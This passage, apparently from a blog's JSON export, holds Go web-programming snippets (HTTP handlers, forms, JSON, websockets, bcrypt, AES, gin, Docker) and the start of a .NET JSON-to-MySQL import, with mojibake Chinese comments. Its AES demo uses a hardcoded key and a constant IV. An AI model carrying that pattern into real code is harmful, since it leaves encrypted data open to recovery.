æ–‡ä»¶ http.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) &#123; // è¯»å– HTML æ–‡ä»¶ data, err := ioutil.ReadFile(htmlFilePath) if err != nil &#123; http.Error(w, &quot;Error reading HTML file&quot;, http.StatusInternalServerError) return &#125; // å°†æ–‡ä»¶å†…å®¹å†™å…¥ HTTP å“åº” w.Header().Set(&quot;Content-Type&quot;, &quot;text/html; charset=utf-8&quot;) w.Write(data) &#125;) // å¯åŠ¨ HTTP æœåŠ¡å™¨å¹¶ç›‘å¬ç«¯å£ 8080 log.Println(&quot;Listening on :8080...&quot;) if err := http.ListenAndServe(&quot;:8080&quot;, nil); err != nil &#123; log.Fatal(&quot;ListenAndServe: &quot;, err) &#125; &#125; from12345678910111213141516171819202122232425262728293031323334353637383940package mainimport ( &quot;html/template&quot; &quot;net/http&quot; &quot;fmt&quot;)type ContactDetails struct &#123; Email string Subject string Message string&#125;func main() &#123; tmpl := template.Must(template.ParseFiles(&quot;temp.html&quot;)) http.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) &#123; if r.Method != http.MethodPost &#123; tmpl.Execute(w, nil) return &#125; details := ContactDetails&#123; Email: r.FormValue(&quot;email&quot;), Subject: r.FormValue(&quot;sub&quot;), Message: r.FormValue(&quot;msg&quot;), &#125; fmt.Println(details) fmt.Println(details.Email) // do something with details _ = details tmpl.Execute(w, struct&#123; Success bool &#125;&#123;true&#125;) &#125;) http.ListenAndServe(&quot;:8080&quot;, nil)&#125; 1234567891011121314&#123;&#123;if .Success&#125;&#125; &lt;h1&gt; message!&lt;/h1&gt;&#123;&#123;else&#125;&#125; &lt;h1&gt;Contact&lt;/h1&gt; &lt;form method=&quot;POST&quot;&gt; &lt;label&gt;Email:&lt;/label&gt;&lt;br /&gt; &lt;input type=&quot;text&quot; name=&quot;email&quot;&gt;&lt;br /&gt; &lt;label&gt;Subject:&lt;/label&gt;&lt;br /&gt; &lt;input type=&quot;text&quot; name=&quot;sub&quot;&gt;&lt;br /&gt; &lt;label&gt;Message:&lt;/label&gt;&lt;br /&gt; &lt;textarea name=&quot;msg&quot;&gt;&lt;/textarea&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt;&#123;&#123;end&#125;&#125; HandleFunc123456789101112131415161718192021222324252627282930// basic-middleware.gopackage mainimport ( &quot;fmt&quot; &quot;log&quot; &quot;net/http&quot;)func logging(f http.HandlerFunc) http.HandlerFunc &#123; return func(w http.ResponseWriter, r *http.Request) &#123; log.Println(r.URL.Path) f(w, r) &#125;&#125;func foo(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintln(w, &quot;www&quot;)&#125;func bar(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintln(w, &quot;bbb&quot;)&#125;func main() &#123; http.HandleFunc(&quot;/www&quot;, logging(foo)) http.HandleFunc(&quot;/bbb&quot;, logging(bar)) http.ListenAndServe(&quot;:24614&quot;, nil)&#125; json123456789101112131415161718192021222324252627282930313233343536373839package mainimport ( &quot;encoding/json&quot; &quot;fmt&quot; &quot;net/http&quot;)type User struct &#123; Firstname string `json:&quot;firstname&quot;` Lastname string `json:&quot;lastname&quot;` Age int `json:&quot;age&quot;`&#125;func main() &#123; http.HandleFunc(&quot;/decode&quot;, func(w http.ResponseWriter, r *http.Request) &#123; var user User json.NewDecoder(r.Body).Decode(&amp;user) fmt.Fprintf(w, &quot;%s %s is %d years old!&quot;, user.Firstname, user.Lastname, user.Age) &#125;) http.HandleFunc(&quot;/encode&quot;, func(w http.ResponseWriter, r *http.Request) &#123; peter := User&#123; Firstname: &quot;m&quot;, Lastname: &quot;s&quot;, Age: 25, &#125; json.NewEncoder(w).Encode(peter) &#125;) http.ListenAndServe(&quot;:24614&quot;, nil)&#125;//&#123;&quot;firstname&quot;:&quot;e&quot;,&quot;lastname&quot;:&quot;m&quot;,&quot;age&quot;:28&#125;//curl -s -XPOST -d&#x27;&#123;&quot;firstname&quot;:&quot;e&quot;,&quot;lastname&quot;:&quot;m&quot;,&quot;age&quot;:28&#125;&#x27; http://localhost:24614/decode//curl -s http://localhost:8080/encode webapi get123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package main import ( &quot;encoding/json&quot; &quot;fmt&quot; &quot;io/ioutil&quot; &quot;log&quot; &quot;net/http&quot; ) // å®šä¹‰ä¸JSONå“åº”ç›¸å¯¹åº”çš„ç»“æ„ä½“ type APIResponse struct &#123; IsOk bool `json:&quot;isOk&quot;` Code int `json:&quot;code&quot;` Msg string `json:&quot;msg&quot;` RsData interface&#123;&#125; `json:&quot;rsData&quot;` // å¦‚æœrsDataå¯èƒ½æ˜¯ä¸åŒçš„ç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨interface&#123;&#125; &#125; func main() &#123; // è®¾ç½®APIçš„URL url :=&quot;https://localhost:32768/api/v10/xxx/rsRsModel2?t1=1&quot; // å‘é€GETè¯·æ±‚ resp, err := http.Get(url) if err != nil &#123; log.Fatal(err) &#125; defer resp.Body.Close() // ç¡®ä¿å…³é—­å“åº”ä½“ // è¯»å–å“åº”ä½“ body, err := ioutil.ReadAll(resp.Body) if err != nil &#123; log.Fatal(err) &#125; // è§£æJSONå“åº” var result APIResponse err = json.Unmarshal(body, &amp;result) if err != nil &#123; log.Fatal(err) &#125; // æ‰“å°ç»“æœ fmt.Printf(&quot;IsOk: %v\\n&quot;, result.IsOk) fmt.Printf(&quot;Code: %d\\n&quot;, result.Code) fmt.Printf(&quot;Msg: %s\\n&quot;, result.Msg) fmt.Printf(&quot;RsData: %v\\n&quot;, result.RsData) if result.IsOk &amp;&amp; result.Code == 1 &#123; &#125; else &#123; &#125; &#125; websocket123456789101112131415161718192021222324252627282930313233343536373839404142package mainimport ( &quot;fmt&quot; &quot;net/http&quot; &quot;github.com/gorilla/websocket&quot;)var upgrader = websocket.Upgrader&#123; ReadBufferSize: 1024, WriteBufferSize: 1024,&#125;func main() &#123; http.HandleFunc(&quot;/echo&quot;, func(w http.ResponseWriter, r *http.Request) &#123; conn, _ := upgrader.Upgrade(w, r, nil) // error ignored for sake of simplicity for &#123; // Read message from browser msgType, msg, err := conn.ReadMessage() if err != nil &#123; return &#125; // Print the message to the console fmt.Printf(&quot;%s sent: %s\\n&quot;, conn.RemoteAddr(), string(msg)) // Write message back to browser if err = conn.WriteMessage(msgType, msg); err != nil &#123; return &#125; &#125; &#125;) http.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) &#123; http.ServeFile(w, r, &quot;ws.html&quot;) &#125;) http.ListenAndServe(&quot;:24614&quot;, nil)&#125; 12345678910111213141516171819202122&lt;input id=&quot;input&quot; type=&quot;text&quot; /&gt;&lt;button onclick=&quot;send()&quot;&gt;Send&lt;/button&gt;&lt;pre id=&quot;output&quot;&gt;&lt;/pre&gt;&lt;script&gt; var input = document.getElementById(&quot;input&quot;); var output = document.getElementById(&quot;output&quot;); var socket = new WebSocket(&quot;ws://localhost:24614/echo&quot;); socket.onopen = function () &#123; output.innerHTML += &quot;Status: Connected\\n&quot;; &#125;; socket.onmessage = function (e) &#123; output.innerHTML += &quot;Server: &quot; + e.data + &quot;\\n&quot;; &#125;; function send() &#123; socket.send(input.value); input.value = &quot;&quot;; &#125;&lt;/script&gt; hash12345678910111213141516171819202122232425262728package mainimport ( &quot;fmt&quot; &quot;golang.org/x/crypto/bcrypt&quot;)func HashPassword(password string) (string, error) &#123; bytes, err := bcrypt.GenerateFromPassword([]byte(password), 14) return string(bytes), err&#125;func CheckPasswordHash(password, hash string) bool &#123; err := bcrypt.CompareHashAndPassword([]byte(hash), []byte(password)) return err == nil&#125;func main() &#123; password := &quot;musu&quot; hash, _ := HashPassword(password) // ignore error for the sake of simplicity fmt.Println(&quot;Password:&quot;, password) fmt.Println(&quot;Hash: &quot;, hash) match := CheckPasswordHash(password, hash) fmt.Println(&quot;Match: &quot;, match)&#125; aes123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172package mainimport (// &quot;bytes&quot; &quot;crypto/aes&quot; &quot;crypto/cipher&quot; &quot;encoding/base64&quot; &quot;fmt&quot;)func Encrypt(plainText, key string) (string, error) &#123; block, err := aes.NewCipher([]byte(key)) if err != nil &#123; return &quot;&quot;, err &#125; iv := []byte&#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 0, 0, 0, 0, 0, 0&#125; cfb := cipher.NewCFBEncrypter(block, iv) ciphertext := make([]byte, len(plainText)) cfb.XORKeyStream(ciphertext, []byte(plainText)) return base64.StdEncoding.EncodeToString(ciphertext), nil&#125;func Decrypt(cipherText, key string) (string, error) &#123; block, err := aes.NewCipher([]byte(key)) if err != nil &#123; return &quot;&quot;, err &#125; decryptedBytes, err := base64.StdEncoding.DecodeString(cipherText) if err != nil &#123; return &quot;&quot;, err &#125; iv := []byte&#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 0, 0, 0, 0, 0, 0&#125; cfb := cipher.NewCFBDecrypter(block, iv) plaintext := make([]byte, len(decryptedBytes)) cfb.XORKeyStream(plaintext, decryptedBytes) return string(plaintext), nil&#125;func main() &#123; plainText := &quot;mus11test111u&quot; key := &quot;thisisaverysecretkeymusu&quot; // åŠ å¯† encrypted, err := Encrypt(plainText, key) if err != nil &#123; fmt.Println(&quot;Encryption failed:&quot;, err) return &#125; fmt.Println(&quot;Encrypted:&quot;, encrypted) //encrypted = &quot;2gAFF&quot; // è§£å¯† decrypted, err := Decrypt(encrypted, key) if err != nil &#123; fmt.Println(&quot;Decryption failed:&quot;, err) return &#125; fmt.Println(&quot;Decrypted:&quot;, decrypted)&#125; ginæœ‰ç‚¹åƒexpress.js 1go get -u github.com/gin-gonic/gin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package mainimport ( &quot;github.com/gin-gonic/gin&quot; &quot;fmt&quot; &quot;net/http&quot;)type User struct &#123; Name string `json:&quot;name&quot;` Age int `json:&quot;age&quot;`&#125;func main() &#123; r := gin.Default() //middleware r.Use(func(c *gin.Context) &#123; fmt.Println(&quot;middleware called&quot;) c.Next() &#125;) r.GET(&quot;/&quot;, func(c *gin.Context) &#123; c.String(200, &quot;hello ~ &quot;) &#125;) //router r.GET(&quot;/user/:name&quot;, func(c *gin.Context) &#123; name := c.Param(&quot;name&quot;) c.String(200, &quot;hi, %s!&quot;, name) &#125;) //static r.Static(&quot;/static&quot;, &quot;./static&quot;) /////http://localhost:24614/user/m //get r.GET(&quot;/users&quot;, func(c *gin.Context) &#123; user := User&#123;Name: &quot;mu&quot;, Age: 15&#125; c.JSON(http.StatusOK, user)//users &#125;) // err r.NoRoute(func(c *gin.Context) &#123; c.JSON(http.StatusNotFound, gin.H&#123;&quot;error&quot;: &quot;Page not found&quot;&#125;) &#125;) r.Run(&quot;:24614&quot;)&#125; dockermain.go 123456789101112131415161718192021222324252627282930313233# ä½¿ç”¨å®˜æ–¹çš„ Go è¿è¡Œæ—¶ä½œä¸ºåŸºç¡€é•œåƒFROM golang:1.18-alpine as builder# è®¾ç½®å·¥ä½œç›®å½•WORKDIR /app# å°†æºä»£ç å¤åˆ¶åˆ°å·¥ä½œç›®å½•COPY . .# è®¾ç½® GOPATH å’Œ GOBINï¼ˆå¯é€‰ï¼‰ENV GOPATH=/goENV PATH=$GOPATH/bin:$PATH# æ„å»º Go åº”ç”¨RUN go build -o app .# ä½¿ç”¨ Alpine Linux ä½œä¸ºæœ€ç»ˆçš„è¿è¡Œæ—¶ç¯å¢ƒFROM alpine:latest# è®¾ç½®å·¥ä½œç›®å½•WORKDIR /app# å°†ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶ä» builder é˜¶æ®µå¤åˆ¶åˆ°æœ€ç»ˆé•œåƒCOPY --from=builder /app/app /app/app# ç»™äºŒè¿›åˆ¶æ–‡ä»¶æ·»åŠ æ‰§è¡Œæƒé™RUN chmod +x /app/app# æš´éœ²åº”ç”¨éœ€è¦ç›‘å¬çš„ç«¯å£EXPOSE 8080# è®¾ç½®å®¹å™¨å¯åŠ¨æ—¶è¿è¡Œçš„å‘½ä»¤CMD [&quot;/app/app&quot;] build 12docker build -t your-image-name .docker run -p 8080:8080 your-image-name 1http://localhost:8080/ push 12docker logindocker push your-image-name","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"go","slug":"go","permalink":"https://banjinmei.github.io/tags/go/"}],"author":"mu"},{"title":".NET JSON2MySQL","slug":"NET-JSON2MySQL","date":"2024-06-12T14:35:33.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/12/NET-JSON2MySQL/","permalink":"https://banjinmei.github.io/2024/06/12/NET-JSON2MySQL/","excerpt":"","text":"è¿™æ˜¯ä¸€æ®µjson 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454[ &#123; &quot;id&quot;: 1, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;101010100&quot;, &quot;city_name&quot;: &quot;åŒ—äº¬&quot;, &quot;post_code&quot;: &quot;100000&quot;, &quot;area_code&quot;: &quot;010&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:06&quot; &#125;, &#123; &quot;id&quot;: 2, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;å®‰å¾½&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 3, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;ç¦å»º&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 4, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;ç”˜è‚ƒ&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 5, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;å¹¿ä¸œ&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 6, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;å¹¿è¥¿&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 7, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;è´µå·&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 8, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;æµ·å—&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: &quot;2024-06-11 17:03:37&quot; &#125;, &#123; &quot;id&quot;: 9, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;æ²³åŒ—&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: &quot;2024-06-11 17:30:06&quot; &#125;, &#123; &quot;id&quot;: 10, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;æ²³å—&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: &quot;2024-06-11 17:30:07&quot; &#125;, &#123; &quot;id&quot;: 11, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;é»‘é¾™æ±Ÿ&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 12, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;æ¹–åŒ—&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 13, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;æ¹–å—&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 14, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;å‰æ—&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: &quot;2024-06-11 17:30:07&quot; &#125;, &#123; &quot;id&quot;: 15, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;æ±Ÿè‹&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 16, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;æ±Ÿè¥¿&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 17, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;è¾½å®&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 18, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;å†…è’™å¤&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 19, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;å®å¤&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 20, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;é’æµ·&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 21, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;å±±ä¸œ&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 22, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;å±±è¥¿&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 23, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;é™•è¥¿&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 24, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;101020100&quot;, &quot;city_name&quot;: &quot;ä¸Šæµ·&quot;, &quot;post_code&quot;: &quot;200000&quot;, &quot;area_code&quot;: &quot;021&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:08&quot; &#125;, &#123; &quot;id&quot;: 25, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;å››å·&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 26, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;101030100&quot;, &quot;city_name&quot;: &quot;å¤©æ´¥&quot;, &quot;post_code&quot;: &quot;300000&quot;, &quot;area_code&quot;: &quot;022&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:08&quot; &#125;, &#123; &quot;id&quot;: 27, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;è¥¿è—&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 28, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;æ–°ç–†&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 29, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;äº‘å—&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 30, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;æµ™æ±Ÿ&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 31, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;101040100&quot;, &quot;city_name&quot;: &quot;é‡åº†&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: &quot;023&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:08&quot; &#125;, &#123; &quot;id&quot;: 32, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;101320101&quot;, &quot;city_name&quot;: &quot;é¦™æ¸¯&quot;, &quot;post_code&quot;: &quot;999077&quot;, &quot;area_code&quot;: &quot;+852&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:03:38&quot; &#125;, &#123; &quot;id&quot;: 33, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;101330101&quot;, &quot;city_name&quot;: &quot;æ¾³é—¨&quot;, &quot;post_code&quot;: &quot;999078&quot;, &quot;area_code&quot;: &quot;+853&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:03:39&quot; &#125;, &#123; &quot;id&quot;: 34, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;å°æ¹¾&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 35, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220601&quot;, &quot;city_name&quot;: &quot;å®‰åº†&quot;, &quot;post_code&quot;: &quot;246000&quot;, &quot;area_code&quot;: &quot;0556&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:10&quot; &#125;, &#123; &quot;id&quot;: 36, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220201&quot;, &quot;city_name&quot;: &quot;èšŒåŸ &quot;, &quot;post_code&quot;: &quot;233000&quot;, &quot;area_code&quot;: &quot;0552&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:10&quot; &#125;, &#123; &quot;id&quot;: 37, &quot;pid&quot;: 3400, &quot;city_code&quot;: &quot;101220105&quot;, &quot;city_name&quot;: &quot;å·¢æ¹–å¸‚&quot;, &quot;post_code&quot;: &quot;238000&quot;, &quot;area_code&quot;: &quot;0551&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:03:40&quot; &#125;, &#123; &quot;id&quot;: 38, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101221701&quot;, &quot;city_name&quot;: &quot;æ± å·&quot;, &quot;post_code&quot;: &quot;247100&quot;, &quot;area_code&quot;: &quot;0566&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:10&quot; &#125;, &#123; &quot;id&quot;: 39, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101221101&quot;, &quot;city_name&quot;: &quot;æ»å·&quot;, &quot;post_code&quot;: &quot;239000&quot;, &quot;area_code&quot;: &quot;0550&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:10&quot; &#125;, &#123; &quot;id&quot;: 40, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220801&quot;, &quot;city_name&quot;: &quot;é˜œé˜³&quot;, &quot;post_code&quot;: &quot;236000&quot;, &quot;area_code&quot;: &quot;0558&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:10&quot; &#125;, &#123; &quot;id&quot;: 41, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101221201&quot;, &quot;city_name&quot;: &quot;æ·®åŒ—&quot;, &quot;post_code&quot;: &quot;235000&quot;, &quot;area_code&quot;: &quot;0561&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:11&quot; &#125;, &#123; &quot;id&quot;: 42, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220401&quot;, &quot;city_name&quot;: &quot;æ·®å—&quot;, &quot;post_code&quot;: &quot;232000&quot;, &quot;area_code&quot;: &quot;0554&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:11&quot; &#125;, &#123; &quot;id&quot;: 43, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101221001&quot;, &quot;city_name&quot;: &quot;é»„å±±å¸‚&quot;, &quot;post_code&quot;: &quot;245000&quot;, &quot;area_code&quot;: &quot;0559&quot;, &quot;ctime&quot;: &quot;2024-06-11 21:23:56&quot; &#125;, &#123; &quot;id&quot;: 44, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101221501&quot;, &quot;city_name&quot;: &quot;å…­å®‰&quot;, &quot;post_code&quot;: &quot;237000&quot;, &quot;area_code&quot;: &quot;0564&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:11&quot; &#125;, &#123; &quot;id&quot;: 45, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220501&quot;, &quot;city_name&quot;: &quot;é©¬éå±±&quot;, &quot;post_code&quot;: &quot;243000&quot;, &quot;area_code&quot;: &quot;0555&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:11&quot; &#125;, &#123; &quot;id&quot;: 46, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220701&quot;, &quot;city_name&quot;: &quot;å®¿å·&quot;, &quot;post_code&quot;: &quot;234000&quot;, &quot;area_code&quot;: &quot;0557&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:11&quot; &#125;, &#123; &quot;id&quot;: 47, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101221301&quot;, &quot;city_name&quot;: &quot;é“œé™µ&quot;, &quot;post_code&quot;: &quot;244000&quot;, &quot;area_code&quot;: &quot;0562&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:12&quot; &#125;, &#123; &quot;id&quot;: 48, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220301&quot;, &quot;city_name&quot;: &quot;èŠœæ¹–å¸‚&quot;, &quot;post_code&quot;: &quot;241000&quot;, &quot;area_code&quot;: &quot;0553&quot;, &quot;ctime&quot;: &quot;2024-06-11 21:23:57&quot; &#125;, &#123; &quot;id&quot;: 49, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101221401&quot;, &quot;city_name&quot;: &quot;å®£åŸ&quot;, &quot;post_code&quot;: &quot;242000&quot;, &quot;area_code&quot;: &quot;0563&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:12&quot; &#125;, &#123; &quot;id&quot;: 50, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220901&quot;, &quot;city_name&quot;: &quot;äº³å·&quot;, &quot;post_code&quot;: &quot;236800&quot;, &quot;area_code&quot;: &quot;0558&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:12&quot; &#125; //... ] SQL 123456789101112CREATE TABLE CityInfo (CtId INT NOT NULL AUTO_INCREMENT,Pid INT DEFAULT &#x27;0&#x27;,CityCode VARCHAR(20) DEFAULT &#x27;&#x27;,CityName VARCHAR(110) DEFAULT &#x27;&#x27;,PostCode VARCHAR(20) DEFAULT &#x27;&#x27;,AreaCode VARCHAR(20) DEFAULT &#x27;&#x27;,Ctime DATETIME DEFAULT NULL,CtimeInt bigint DEFAULT &#x27;0&#x27;,LangType INT DEFAULT &#x27;0&#x27;,PRIMARY KEY (CtId)); .NETç±» 123456789101112public class CityInfo&#123; public int CtId &#123; get; set; &#125; public int Pid &#123; get; set; &#125; public string CityCode &#123; get; set; &#125; public string CityName &#123; get; set; &#125; public string PostCode &#123; get; set; &#125; public string AreaCode &#123; get; set; &#125; public DateTime? Ctime &#123; get; set; &#125; public long CtimeInt &#123; get; set; &#125; public int LangType &#123; get; set; &#125;&#125; åç«¯å¤„ç†json file &gt;&gt;&gt; class &gt;&gt;&gt; sql 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[HttpPost] public ActionResult ImportCities(IFormFile file) &#123; try &#123; if (file == null || file.Length == 0) &#123; return Json(new &#123; success = false, message = &quot;No file uploaded.&quot; &#125;); &#125; using (var streamReader = new StreamReader(file.InputStream)) &#123; var jsonData = streamReader.ReadToEnd(); var cityList = JsonConvert.DeserializeObject&lt;List&lt;CityInfo&gt;&gt;(jsonData); using (MySqlConnection connection = new MySqlConnection(ConnectionString)) &#123; 